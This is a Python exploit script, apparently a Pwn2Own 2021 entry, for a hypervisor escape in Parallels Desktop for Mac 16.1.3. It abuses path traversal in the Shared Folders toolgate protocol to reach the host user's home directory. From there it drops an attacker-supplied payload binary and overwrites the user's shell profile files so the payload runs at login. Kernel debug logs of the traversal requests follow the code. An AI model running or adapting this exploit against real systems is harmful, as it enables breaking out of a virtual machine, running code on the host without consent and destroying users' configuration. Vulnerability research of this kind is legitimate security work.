"""
Zero day hypervisor escape exploit for Parallels Desktop for Mac v16.1.3
Author: Alisa Esage (contact@zerodayengineering.com)"
Special for Pwn2Own 2021

Syntax: prl_pwn.py <path_to_payload_binary>
Note: requires a satellite kernel module prl_pwn.kl
"""

from struct import *
from ctypes import *
import os
import fcntl
import stat
import sys


### globals & defines

tg_error = 0; # set to last tg_request.Status from hypervisor
AEDEBUG = 0;


### hypervisor return codes 

TG_STATUS_SUCCESS = 0
TG_STATUS_PENDING = 0xffffffff
TG_STATUS_CANCELLED = 0xf0000000
TG_STATUS_FILE_IS_A_DIRECTORY = 0xf0000010


# toolgate filesystem protocol commands

TG_REQUEST_FS_L_GETSFLIST = 0x220
TG_REQUEST_FS_L_GETSFPARM = 0x221
TG_REQUEST_FS_L_ATTR = 0x222
TG_REQUEST_FS_L_OPEN = 0x223
TG_REQUEST_FS_L_RELEASE = 0x224
TG_REQUEST_FS_L_READDIR = 0x225
TG_REQUEST_FS_L_RW = 0x226
TG_REQUEST_FS_L_REMOVE = 0x227
TG_REQUEST_FS_L_RENAME = 0x228


### toolgate hypercall structures

class TG_REQUEST(Structure):
	_fields_ = [("Request", c_uint), 
	("Status", c_uint), 
	("InlineLen", c_ushort), 
	("BufferCount", c_ushort), 
	("Reserved", c_uint)]

class TG_BUFFER(Structure):
	_fields_ = [("Address", c_void_p),
	("ByteCount", c_uint),
	("Writeable", c_uint)]


### Shared Folders toolgate protocol

"""
/* ToolGate data structure, OS independed data representation*/
struct prlfs_file_desc {
        unsigned long long      fd;
        unsigned long long      offset;
        unsigned int            flags; /* prl_file_flags */
        unsigned int            sfid;

} PACKED;
"""

class prlfs_file_desc(Structure):
	_fields_ = [("fd", c_uint64),
	("offset", c_uint64),
	("flags", c_uint),
	("sfid", c_uint)]

"""
struct prlfs_attr {
	unsigned long long size;
	unsigned long long atime;
	unsigned long long mtime;
	unsigned long long ctime;
	unsigned int mode;
	unsigned int uid;
	unsigned int gid;
	unsigned int valid;
	/* V2 fields */
	unsigned long long ino;
	unsigned long long reserved;
} PACKED;
SFLIN_CHECK_SIZE(prlfs_attr, sizeof(struct prlfs_attr), 64)
"""

class prlfs_attr(Structure):
	_fields_ = [("size", c_uint64),
	("atime", c_uint64),
	("mtime", c_uint64),
	("ctime", c_uint64),
	("mode", c_int),
	("uid", c_int),
	("gid", c_int),
	("valid", c_int),
	("ino", c_uint64),
	("reserved", c_uint64) ]

class STRUCT_TG_REQUEST_FS_L_OPEN(Structure):
	_fields_ = [("Header", TG_REQUEST),
	("Path", TG_BUFFER),
	("Params", TG_BUFFER)]

class STRUCT_TG_REQUEST_FS_L_RW(Structure):
	_fields_ = [("Header", TG_REQUEST),
	("Params", TG_BUFFER), # prlfs_file_desc
	("Data", TG_BUFFER)] # .Writeable = 0 for Read, 1 for Write

class STRUCT_TG_REQUEST_FS_L_RELEASE(Structure):
	_fields_ = [("Header", TG_REQUEST),
	("Params", TG_BUFFER)] # prlfs_file_desc

class STRUCT_TG_REQUEST_FS_L_ATTR(Structure):
	_fields_ = [("Header", TG_REQUEST),
	("Path", TG_BUFFER),
	("Attr", TG_BUFFER)] # struct prlfs_attr


### general helpers 

def maybe_print(what):
	if(AEDEBUG):
		print(what);


## toolgate api functions

def open_tg():
	maybe_print("> open_tg()");
	return os.open("/proc/prl_pwn", os.O_WRONLY); # 1????

def close_tg(fd):
	return os.close(fd);

def call_tg(tg_fd, req):
	maybe_print("> call_tg()");
	global tg_error;
	oserr = os.write(tg_fd, pack("@P", addressof(req)));
	if ( oserr != 0 ):
		return oserr;
	tg_error = req.Header.Status;
	return tg_error;


### general hypercall helpers 

def init_tg_header(buffer, command, inlinelen, bufcount):
	buffer.Header.Request = command;
	buffer.Header.Status = 0xffffffff;
	buffer.Header.InlineLen = inlinelen;
	buffer.Header.BufferCount = bufcount;
	return;

def reset_req(req):
	req.Header.Status = -1;
	return;


### sf hypercall request helpers

def get_req_fs_open(c_filename, fpar):
	req = STRUCT_TG_REQUEST_FS_L_OPEN();
	init_tg_header(req, TG_REQUEST_FS_L_OPEN, 0, 2);
	# filename
	req.Path.Address = addressof(c_filename);
	req.Path.ByteCount = len(c_filename);
	# params
	req.Params.Address = addressof(fpar);
	req.Params.ByteCount = sizeof(fpar);
	req.Params.Writeable = 1;
	return req; 

def get_req_fs_read(fpar, buf):
	req = STRUCT_TG_REQUEST_FS_L_RW();
	init_tg_header(req, TG_REQUEST_FS_L_RW, 0, 2);
	# buffer0 = struct prlfs_file_desc
	req.Params.Address = addressof(fpar);
	req.Params.ByteCount = sizeof(fpar);
	# buffer1 = buffer that will receive read data from file 
	req.Data.Address = addressof(buf);
	req.Data.ByteCount = sizeof(buf);
	req.Data.Writeable = 1;
	return req;

def get_req_fs_write(fpar, buf):
	req = STRUCT_TG_REQUEST_FS_L_RW();
	init_tg_header(req, TG_REQUEST_FS_L_RW, 0, 2);
	# buffer0 = struct prlfs_file_desc
	req.Params.Address = addressof(fpar);
	req.Params.ByteCount = sizeof(fpar);
	# buffer1 = buffer that will receive read data from file 
	req.Data.Address = addressof(buf);
	req.Data.ByteCount = sizeof(buf);
	req.Data.Writeable = 0;
	return req;

def get_req_fs_release(fpar):
	req = STRUCT_TG_REQUEST_FS_L_RELEASE();
	init_tg_header(req, TG_REQUEST_FS_L_RELEASE, 0, 1);
	# buffer0 = struct prlfs_file_desc
	req.Params.Address = addressof(fpar);
	req.Params.ByteCount = sizeof(fpar);
	return req;

def get_req_fs_attr(c_path, attr):
	req = STRUCT_TG_REQUEST_FS_L_ATTR();
	init_tg_header(req, TG_REQUEST_FS_L_ATTR, 0, 2);
	# buffer0 = path 
	req.Path.Address = addressof(c_path);
	req.Path.ByteCount = len(c_path);
	# buffer1 = struct prlfs_attr 
	req.Attr.Address = addressof(attr);
	req.Attr.ByteCount = sizeof(attr);
	return req;


### high level api 

def prlsf_create(filename, mode): # mode = 0644, etc.
	maybe_print("> prlsf_create()");
	fpar = prlfs_file_desc();
	fpar.offset = mode | stat.S_IFREG; # Parallels reuses struct prlfs_file_desc .offset for mode
	maybe_print("Mode: " + hex(fpar.offset))
	fpar.flags = 0xC; # magic value
	if (type(filename) == str):
		filename = bytes(filename, "ascii");
	c_filename = create_string_buffer(filename);
	req = get_req_fs_open(c_filename, fpar);
	tg = open_tg();
	retval = call_tg(tg, req);
	close_tg(tg);
	if (retval == 0):
		return fpar;
	return 0;

def prlsf_open(filename, flags):
	maybe_print("> prlsf_open()");
	fpar = prlfs_file_desc();
	fpar.flags = flags;
	if (type(filename) == str):
		filename = bytes(filename, "ascii");
	c_filename = create_string_buffer(filename);
	req = get_req_fs_open(c_filename, fpar);
	tg = open_tg();
	retval = call_tg(tg, req);
	maybe_print( "Toolgate: " + hex(retval) );
	close_tg(tg);
	if (retval == 0):
		return fpar;
	return 0;

def prlsf_read(fpar, maxlen):
	maybe_print("> prlsf_read()");
	buf = create_string_buffer(maxlen); 
	req = get_req_fs_read(fpar, buf);
	tg = open_tg();
	retval = call_tg(tg, req);
	maybe_print( "Toolgate: " + hex(retval) );
	close_tg(tg);
	if (retval == TG_STATUS_SUCCESS):
		fpar.offset = req.Data.ByteCount;
		return buf;
	return 0;

def prlsf_write(fpar, buf):
	maybe_print("> prlsf_write()");
	if (type(buf) == str):
		buf = bytes(buf, "ascii");
	c_str = create_string_buffer(buf); 
	req = get_req_fs_write(fpar, c_str);
	tg = open_tg();
	retval = call_tg(tg, req);
	maybe_print( "Toolgate: " + hex(retval) );
	close_tg(tg);
	return fpar.offset;

def prlsf_close(fpar):
	maybe_print("> prlsf_close()");
	req = get_req_fs_release(fpar);
	tg = open_tg();
	retval = call_tg(tg, req);
	maybe_print( "Toolgate: " + hex(retval) );
	close_tg(tg);
	if (retval == TG_STATUS_SUCCESS):
		fpar.fd = 0;
		fpar.sfid = 0;
		fpar.offset = 0;
		fpar.flags = 0;
	return;

def prlsf_get_attr(path):
	maybe_print("> prlsf_get_attr()");
	c_path = create_string_buffer(bytes(path, 'ascii'));
	attr = prlfs_attr();
	req = get_req_fs_attr(c_path, attr);
	req.Attr.Writeable = 1;
	tg = open_tg();
	retval = call_tg(tg, req);
	maybe_print( "Toolgate: " + hex(retval) );
	close_tg(tg);
	return attr;

def prlsf_set_attr(path, attr):
	maybe_print("> prlsf_set_attr()");
	c_path = create_string_buffer(bytes(path, 'ascii'));
	req = get_req_fs_attr(c_path, attr);
	req.Attr.Writeable = 0;
	tg = open_tg();
	retval = call_tg(tg, req);
	maybe_print( "Toolgate: " + hex(retval) );
	close_tg(tg);
	return retval;


### exploit primitives

def get_sflist():
	maybe_print("> get_sflist()");
	sf = next(os.walk("/media/psf/"))[1] 
	maybe_print(sf);
	return sf;

def is_home(dir):
	maybe_print("> is_home()");
	if (dir[0] != '/'):
		dir = '/' + dir;
	filename = dir + '/Desktop';
	maybe_print("Filename: " + filename);
	fpar = prlsf_open(filename, os.O_RDONLY);
	if (fpar == 0):
		return False;
	prlsf_write(fpar, "test");
	if ( tg_error == TG_STATUS_FILE_IS_A_DIRECTORY ):
		prlsf_close(fpar);
		filename = dir + '/Documents';
		maybe_print("Filename: " + filename);
		fpar = prlsf_open(filename, os.O_RDONLY);
		if (fpar == 0):
			return False;
		prlsf_write(fpar, "test");
		if ( tg_error == TG_STATUS_FILE_IS_A_DIRECTORY ):
			prlsf_close(fpar);
			return True
	return False;

def traverse_to_home(sf):
	maybe_print("> traverse_to_home()");
	root = '/' + sf;
	for i in range(100):
		if(is_home(root)):
			return root;
		root = root + '/..';
	return None;

def try_find_homedir():
	maybe_print("> try_find_homedir()");
	sfs = get_sflist();
	for sf_i in sfs:
		home = traverse_to_home(sf_i);
		if (home != None):
			return home;
	return None;

def drop_payload(fname, buf): # todo: return values checks
	maybe_print("> drop_payload()");
	print("[*] Dropping payload: " + fname + ", size " + hex(len(buf)) + " bytes")
	prlsf_create(fname, 0o744);
	fpar = prlsf_open(fname, os.O_RDWR|os.O_TRUNC);
	prlsf_write(fpar, buf);
	prlsf_close(fpar);
	return;

def persist(binary_path):
	maybe_print("> persist()");
	home = try_find_homedir();
	for profile in ['.bash_profile', '.bashrc', '.zprofile', '.profile']:
		profilepath = home + '/' + profile; 
		maybe_print(profilepath);
		prlsf_create(profilepath, 0o644);
		fpar = prlsf_open(profilepath, os.O_RDWR|os.O_TRUNC);
		if (fpar):
			prlsf_write(fpar, binary_path + "\n");
			prlsf_close(fpar);
			print("[+] Registered persistence in " + profile);
	return;

### top-level exports

def test_vuln(): 
	maybe_print("> test_vuln()");
	sfs = get_sflist();
	for sf_i in sfs:
		if ( is_home(sf_i) ):
			print("[!] Looks like we're already $HOME")
			return True;
		filename = '/' + sf_i + '/../0';
		maybe_print("Testing filename: " + filename)
		fpar = prlsf_create(filename, 0o644);
		if (fpar == 0):
			maybe_print("Can't create file");
			continue;
		fpar = prlsf_open(filename, os.O_RDWR); 
		prlsf_write(fpar, "test");
		buf = prlsf_read(fpar, 4);
		maybe_print("Read from file: " + str(buf.value));
		prlsf_close(fpar); # TODO: cleanup!
		if(buf.value == b"test"):
			print("[+] Target is vulnerable")
			return True;
		continue;
	print("[-] Not vulnerable")
	return False;

def exploit(payload):
	maybe_print("> exploit()");
	homedir = try_find_homedir();
	if (homedir):
		print("[+] Homedir: " + homedir);
		drop_payload(homedir + '/.pwn2owned', payload);
		persist("~/.pwn2owned");
	return False;

def main(argv):
	global AEDEBUG;
	AEDEBUG = 0;
	sfs = get_sflist();
	print("[+] Found Parallels Shared folders:", sfs);

	print("[*] Checking vulnerability...");
	if (test_vuln()):
		print("[*] Attack in progress...")
		payloadfile = argv[1];
		print("[+] Payload file: " + payloadfile);
		payload = open(payloadfile, "rb").read();
		exploit(payload);
		print("[+] Exploit seems to be successful!")

if __name__ == "__main__":
	main(sys.argv)


"""
	TG_REQUEST_FS_L_ATTR
	[  137.308372] buf 0, size = 24, dbuf = ffffbfc2c6605020 ->
	[  137.308375] TG_PAGED_BUFFER :00000000: 2f 70 72 6c 5f 6d 6f 64 2f 2e 2e 2f 2e 2e 2f 74  /prl_mod/../../t
	[  137.308376] TG_PAGED_BUFFER :00000010: 65 73 74 2e 74 78 74 00                          est.txt.
	[  137.308378] buf 1, size = 64, dbuf = ffffbfc2c6605038 ->
	[  137.308379] TG_PAGED_BUFFER :00000000: 74 91 39 13 c0 aa 4d 24 00 50 5e c6 c2 bf ff ff  t.9...M$.P^.....
	[  137.308380] TG_PAGED_BUFFER :00000010: 00 20 00 00 00 00 00 00 02 00 00 00 00 00 00 00  . ..............
	[  137.308381] TG_PAGED_BUFFER :00000020: 00 56 b3 20 d3 97 ff ff 01 00 00 00 00 00 00 00  .V. ............
	[  137.308382] TG_PAGED_BUFFER :00000030: 00 00 00 00 00 00 00 00 d6 f2 19 c0 ff ff ff ff  ................
	[  137.308383] TG_PAGED_REQUEST:00000000: 22 02 00 00 ff ff ff ff 48 00 00 00 00 00 02 00  ".......H.......
	[  137.308384] TG_PAGED_REQUEST:00000010: 8f 0d 2e 00 00 00 00 00 cb 2f cd 1b d3 97 ff ff  ........./......
	[  137.308385] TG_PAGED_REQUEST:00000020: 18 00 00 00 00 00 00 00 d2 bc 31 00 00 00 00 00  ..........1.....
	[  137.308386] TG_PAGED_REQUEST:00000030: 80 f8 73 f1 d2 97 ff ff 40 00 00 00 01 00 00 00  ..s.....@.......
	[  137.308387] TG_PAGED_REQUEST:00000040: 3f 17 2f 00 00 00 00 00                          ?./.....

	TG_REQUEST_FS_L_OPEN (create inode)
	[  137.308622] buf 0, size = 24, dbuf = ffffbfc2c6609020 ->
	[  137.308624] TG_PAGED_BUFFER :00000000: 2f 70 72 6c 5f 6d 6f 64 2f 2e 2e 2f 2e 2e 2f 74  /prl_mod/../../t
	[  137.308625] TG_PAGED_BUFFER :00000010: 65 73 74 2e 74 78 74 00                          est.txt.
	[  137.308626] buf 1, size = 24, dbuf = ffffbfc2c6609038 ->
	[  137.308628] TG_PAGED_BUFFER :00000000: 00 00 00 00 00 00 00 00 a4 81 00 00 00 00 00 00  ................
	[  137.308629] TG_PAGED_BUFFER :00000010: 0c 00 00 00 00 00 00 00                          ........
	[  137.308630] TG_PAGED_REQUEST:00000000: 23 02 00 00 ff ff ff ff 48 00 00 00 00 00 02 00  #.......H.......
	[  137.308631] TG_PAGED_REQUEST:00000010: 8f 0d 2e 00 00 00 00 00 cb 2f cd 1b d3 97 ff ff  ........./......
	[  137.308632] TG_PAGED_REQUEST:00000020: 18 00 00 00 00 00 00 00 d2 bc 31 00 00 00 00 00  ..........1.....
	[  137.308633] TG_PAGED_REQUEST:00000030: c0 b3 a8 3b d3 97 ff ff 18 00 00 00 01 00 00 00  ...;............
	[  137.308633] TG_PAGED_REQUEST:00000040: 8b ba 33 00 00 00 00 00                          ..3.....

	// buffer 1
	/* ToolGate data structure, OS independed data representation*/
	struct prlfs_file_desc {
			unsigned long long      fd;
			unsigned long long      offset;
			unsigned int            flags; /* prl_file_flags */
			unsigned int            sfid;

	} PACKED;

	TG_REQUEST_FS_L_OPEN (open file)
	[  137.308975] buf 0, size = 24, dbuf = ffffbfc2c660d020 ->
	[  137.308978] TG_PAGED_BUFFER :00000000: 2f 70 72 6c 5f 6d 6f 64 2f 2e 2e 2f 2e 2e 2f 74  /prl_mod/../../t
	[  137.308980] TG_PAGED_BUFFER :00000010: 65 73 74 2e 74 78 74 00                          est.txt.
	[  137.308981] buf 1, size = 24, dbuf = ffffbfc2c660d038 ->
	[  137.308982] TG_PAGED_BUFFER :00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
	[  137.308983] TG_PAGED_BUFFER :00000010: 4c 10 00 00 00 00 00 00                          L.......
	[  137.308984] TG_PAGED_REQUEST:00000000: 23 02 00 00 ff ff ff ff 48 00 00 00 00 00 02 00  #.......H.......
	[  137.308985] TG_PAGED_REQUEST:00000010: 8f 0d 2e 00 00 00 00 00 cb 2f cd 1b d3 97 ff ff  ........./......
	[  137.308986] TG_PAGED_REQUEST:00000020: 18 00 00 00 00 00 00 00 d2 bc 31 00 00 00 00 00  ..........1.....
	[  137.308987] TG_PAGED_REQUEST:00000030: 20 b7 a8 3b d3 97 ff ff 18 00 00 00 01 00 00 00   ..;............
	[  137.308988] TG_PAGED_REQUEST:00000040: 8b ba 33 00 00 00 00 00                          ..3.....

	TG_REQUEST_FS_L_RW
	[  137.309253] buf 0, size = 24, dbuf = ffffbfc2c6611020 ->
	[  137.309255] TG_PAGED_BUFFER :00000000: 46 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  F...............
	[  137.309256] TG_PAGED_BUFFER :00000010: 02 00 00 00 03 00 00 00                          ........
	[  137.309259] buf 1, size = 2, dbuf = ffffbfc2c6611038 ->
	[  137.309260] TG_PAGED_BUFFER :00000000: 30 0a                                            0.
	[  137.309261] TG_PAGED_REQUEST:00000000: 26 02 00 00 ff ff ff ff 48 00 00 00 00 00 02 00  &.......H.......
	[  137.309263] TG_PAGED_REQUEST:00000010: 8f 0d 2e 00 00 00 00 00 20 b7 a8 3b d3 97 ff ff  ........ ..;....
	[  137.309263] TG_PAGED_REQUEST:00000020: 18 00 00 00 00 00 00 00 8b ba 33 00 00 00 00 00  ..........3.....
	[  137.309264] TG_PAGED_REQUEST:00000030: 80 2c bb 4d 47 56 00 00 02 00 00 00 00 00 00 00  .,.MGV..........
	[  137.309265] TG_PAGED_REQUEST:00000040: 70 17 2d 00 00 00 00 00                          p.-.....

	TG_REQUEST_FS_L_RELEASE
	[  137.309447] buf 0, size = 24, dbuf = ffffbfc2c6615020 ->
	[  137.309450] TG_PAGED_BUFFER :00000000: 46 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  F...............
	[  137.309451] TG_PAGED_BUFFER :00000010: 00 00 00 00 03 00 00 00                          ........
	[  137.309452] TG_PAGED_REQUEST:00000000: 24 02 00 00 ff ff ff ff 30 00 00 00 00 00 01 00  $.......0.......
	[  137.309453] TG_PAGED_REQUEST:00000010: 8f 0d 2e 00 00 00 00 00 20 b7 a8 3b d3 97 ff ff  ........ ..;....
	[  137.309455] TG_PAGED_REQUEST:00000020: 18 00 00 00 00 00 00 00 8b ba 33 00 00 00 00 00  ..........3.....

	$ chmod +x 	
	TG_REQUEST_FS_L_ATTR
	[  834.942870] buf 0, size = 44, dbuf = ffffbfc2c6da5020 ->
	[  834.942873] TG_PAGED_BUFFER :00000000: 2f 70 72 6c 5f 6d 6f 64 2f 70 72 6c 5f 74 67 2f  /prl_mod/prl_tg/
	[  834.942875] TG_PAGED_BUFFER :00000010: 54 6f 6f 6c 67 61 74 65 2f 47 75 65 73 74 2f 4c  Toolgate/Guest/L
	[  834.942876] TG_PAGED_BUFFER :00000020: 69 6e 75 78 2f 70 72 6c 5f 74 67 00              inux/prl_tg.
	[  834.942877] buf 1, size = 64, dbuf = ffffbfc2c6da5038 ->
	[  834.942878] TG_PAGED_BUFFER :00000000: 74 96 39 13 c0 aa 4d 24 48 f8 73 f1 d2 97 ff ff  t.9...M$H.s.....
	[  834.942879] TG_PAGED_BUFFER :00000010: 48 f8 73 f1 d2 97 ff ff 00 00 00 00 00 00 00 00  H.s.............
	[  834.942880] TG_PAGED_BUFFER :00000020: 00 00 00 00 00 00 00 00 00 d9 7a 3a d3 97 ff ff  ..........z:....
	[  834.942881] TG_PAGED_BUFFER :00000030: 28 00 00 00 00 00 00 00 94 04 1a c0 ff ff ff ff  (...............
	[  834.942882] TG_PAGED_REQUEST:00000000: 22 02 00 00 ff ff ff ff 48 00 00 00 00 00 02 00  ".......H.......
	[  834.942883] TG_PAGED_REQUEST:00000010: 17 0d 2e 00 00 00 00 00 d4 cf cd 1b d3 97 ff ff  ................
	[  834.942884] TG_PAGED_REQUEST:00000020: 2c 00 00 00 00 00 00 00 dc bc 31 00 00 00 00 00  ,.........1.....
	[  834.942885] TG_PAGED_REQUEST:00000030: 40 f8 73 f1 d2 97 ff ff 40 00 00 00 01 00 00 00  @.s.....@.......
	[  834.942886] TG_PAGED_REQUEST:00000040: 3f 17 2f 00 00 00 00 00                          ?./.....

	TG_REQUEST_FS_L_ATTR
	[  834.944775] buf 0, size = 24, dbuf = ffffbfc2c6da9020 ->
	[  834.944777] TG_PAGED_BUFFER :00000000: 2f 70 72 6c 5f 6d 6f 64 2f 2e 2e 2f 2e 2e 2f 74  /prl_mod/../../t
	[  834.944779] TG_PAGED_BUFFER :00000010: 65 73 74 2e 74 78 74 00                          est.txt.
	[  834.944780] buf 1, size = 64, dbuf = ffffbfc2c6da9038 ->
	[  834.944781] TG_PAGED_BUFFER :00000000: 74 96 39 13 c0 aa 4d 24 c0 f7 73 f1 d2 97 ff ff  t.9...M$..s.....
	[  834.944782] TG_PAGED_BUFFER :00000010: 68 89 5c 3f d3 97 ff ff 02 00 00 08 00 00 00 00  h.\?............
	[  834.944783] TG_PAGED_BUFFER :00000020: 02 00 00 00 00 00 00 00 08 00 00 00 6b 65 72 6e  ............kern
	[  834.944784] TG_PAGED_BUFFER :00000030: 2e 6c 6f 67 00 00 00 00 94 04 1a c0 ff ff ff ff  .log............
	[  834.944785] TG_PAGED_REQUEST:00000000: 22 02 00 00 ff ff ff ff 48 00 00 00 00 00 02 00  ".......H.......
	[  834.944786] TG_PAGED_REQUEST:00000010: 4d 9e 2e 00 00 00 00 00 cb df cd 1b d3 97 ff ff  M...............
	[  834.944787] TG_PAGED_REQUEST:00000020: 18 00 00 00 00 00 00 00 dd bc 31 00 00 00 00 00  ..........1.....
	[  834.944788] TG_PAGED_REQUEST:00000030: c0 f7 73 f1 d2 97 ff ff 40 00 00 00 01 00 00 00  ..s.....@.......
	[  834.944789] TG_PAGED_REQUEST:00000040: 3f 17 2f 00 00 00 00 00                          ?./.....

	TG_REQUEST_FS_L_ATTR
	[  834.945010] buf 0, size = 24, dbuf = ffffbfc2c6dad020 ->
	[  834.945013] TG_PAGED_BUFFER :00000000: 2f 70 72 6c 5f 6d 6f 64 2f 2e 2e 2f 2e 2e 2f 74  /prl_mod/../../t
	[  834.945014] TG_PAGED_BUFFER :00000010: 65 73 74 2e 74 78 74 00                          est.txt.
	[  834.945015] buf 1, size = 64, dbuf = ffffbfc2c6dad038 ->
	[  834.945016] TG_PAGED_BUFFER :00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
	[  834.945017] TG_PAGED_BUFFER :00000010: 00 00 00 00 00 00 00 00 a5 c7 58 60 00 00 00 00  ..........X`....
                                                                      ^ .mtime
	[  834.945018] TG_PAGED_BUFFER :00000020: ed 01 00 00 00 00 00 00 00 00 00 00 18 00 00 00  ................
	                                          ^ .mode                             ^ .valid 
	[  834.945019] TG_PAGED_BUFFER :00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
	[  834.945020] TG_PAGED_REQUEST:00000000: 22 02 00 00 ff ff ff ff 48 00 00 00 00 00 02 00  ".......H.......
	[  834.945021] TG_PAGED_REQUEST:00000010: 4d 9e 2e 00 00 00 00 00 cb cf cd 1b d3 97 ff ff  M...............
	[  834.945022] TG_PAGED_REQUEST:00000020: 18 00 00 00 00 00 00 00 dc bc 31 00 00 00 00 00  ..........1.....
	[  834.945023] TG_PAGED_REQUEST:00000030: c0 f7 73 f1 d2 97 ff ff 40 00 00 00 00 00 00 00  ..s.....@.......
	[  834.945024] TG_PAGED_REQUEST:00000040: 3f 17 2f 00 00 00 00 00                          ?./.....

"""